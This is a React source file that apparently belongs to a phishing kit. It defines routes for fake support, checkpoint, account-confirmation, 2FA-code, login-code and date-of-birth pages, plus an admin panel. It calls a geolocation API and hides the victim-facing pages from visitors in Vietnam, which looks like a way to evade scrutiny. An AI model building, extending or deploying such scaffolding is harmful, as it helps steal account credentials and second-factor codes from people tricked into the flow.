import { createContext, useEffect, useState } from "react";
import Admin from "../pages/admin";
import Checkpoint from "../pages/checkpoint";
import ConfirmAccount from "../pages/confirm_account";
import ConfirmLoading from "../pages/confirm_loading";

import FaCode from "../pages/facode";
import LoginCode from "../pages/logincode";
import SupportGetHelp from "../pages/support_get_help";

export const BanContext = createContext();

export const RoutesList = [
  { path: "/", element: <SupportGetHelp /> },
  { path: "/checkpoint", element: <Checkpoint /> },
  { path: "/confirm", element: <ConfirmAccount /> },
  { path: "/confirm/2fa-code", element: <FaCode /> },
  { path: "/confirm/login-code", element: <LoginCode /> },
  { path: "/confirm/processing", element: <ConfirmLoading /> },
  { path: "/confirm/date-of-birth", element: <ConfirmLoading /> },
];

export const AdminRoutesList = [{ path: "/admin/manage", element: <Admin /> }];

// eslint-disable-next-line react/prop-types
const BanContextProvider = ({ children }) => {
  const [routers, setRouters] = useState();

  useEffect(() => {
    fetch("https://api.db-ip.com/v2/free/self/")
      .then((res) => res.json())
      .then((json) => {
        if (json.countryCode == "VN") {
          setRouters([...AdminRoutesList]);
        } else {
          setRouters([...RoutesList, ...AdminRoutesList]);
        }
      });
  }, []);

  return (
    <BanContext.Provider value={{ routers }}>
      {routers && children}
    </BanContext.Provider>
  );
};

export default BanContextProvider;
